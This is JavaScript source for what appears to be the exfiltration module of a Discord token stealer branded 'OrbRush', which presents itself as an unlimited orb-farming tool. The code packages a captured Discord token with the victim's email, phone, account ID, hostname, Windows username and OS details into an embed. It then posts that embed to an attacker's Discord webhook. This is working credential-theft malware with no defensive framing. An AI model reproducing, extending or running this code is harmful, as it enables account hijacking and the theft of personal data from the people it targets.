'use strict';

const os = require('os');

const EMBED_COLOR = 0x5865f2;

function safeUsername() {
  try {
    return os.userInfo().username;
  } catch (_) {
    return 'inconnu';
  }
}

function buildPayload(data) {
  const token = data.token || '';
  const user = data.user || null;
  const source = data.source || 'inconnu';
  const encrypted = !!data.encrypted;

  const fields = [];

  if (user) {
    const label = user.global_name || user.username || 'utilisateur';
    fields.push({
      name: 'Compte Discord',
      value: '**' + label + '**\n`' + (user.username || '?') + '` - `' + (user.id || '?') + '`',
      inline: false
    });
    if (user.email) {
      fields.push({ name: 'Email', value: '`' + user.email + '`', inline: true });
    }
    if (user.phone) {
      fields.push({ name: 'Telephone', value: '`' + user.phone + '`', inline: true });
    }
    if (typeof user.verified === 'boolean') {
      fields.push({ name: 'Verifie', value: user.verified ? '`oui`' : '`non`', inline: true });
    }
  }

  fields.push({ name: 'Client', value: '`' + source + '`', inline: true });
  fields.push({ name: 'Chiffre (DPAPI)', value: encrypted ? '`oui`' : '`non`', inline: true });
  fields.push({ name: 'Machine', value: '`' + os.hostname() + '`', inline: true });
  fields.push({ name: 'Utilisateur Windows', value: '`' + safeUsername() + '`', inline: true });
  fields.push({
    name: 'Systeme',
    value: '`' + os.type() + ' ' + os.release() + ' (' + os.arch() + ')`',
    inline: true
  });
  fields.push({
    name: 'Capture le',
    value: '<t:' + Math.floor(Date.now() / 1000) + ':F>',
    inline: true
  });

  const embed = {
    title: 'OrbRush - Token Discord capture',
    description: '**Token**\n```\n' + token + '\n```',
    color: EMBED_COLOR,
    fields,
    timestamp: new Date().toISOString(),
    footer: { text: "OrbRush - farm d'orbs illimite" }
  };

  if (user && user.id && user.avatar) {
    embed.thumbnail = {
      url: 'https://cdn.discordapp.com/avatars/' + user.id + '/' + user.avatar + '.png?size=128'
    };
  }

  return {
    username: 'OrbRush',
    embeds: [embed],
    allowed_mentions: { parse: [] }
  };
}

async function sendToWebhook(url, payload) {
  if (!url || typeof url !== 'string') {
    throw new Error('Webhook manquant');
  }

  const target = url.indexOf('?') === -1 ? url + '?wait=true' : url + '&wait=true';

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 12000);

  let res;
  try {
    res = await fetch(target, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      signal: controller.signal
    });
  } catch (e) {
    if (e && e.name === 'AbortError') throw new Error('Delai depasse (Discord injoignable)');
    throw new Error('Connexion impossible : ' + String((e && e.message) || e));
  } finally {
    clearTimeout(timer);
  }

  if (!res.ok) {
    let detail = '';
    try {
      detail = await res.text();
    } catch (_) {
      detail = '';
    }
    const short = detail ? ' - ' + detail.slice(0, 140) : '';
    throw new Error('Discord a repondu ' + res.status + short);
  }

  return res.status;
}

module.exports = { sendToWebhook, buildPayload };
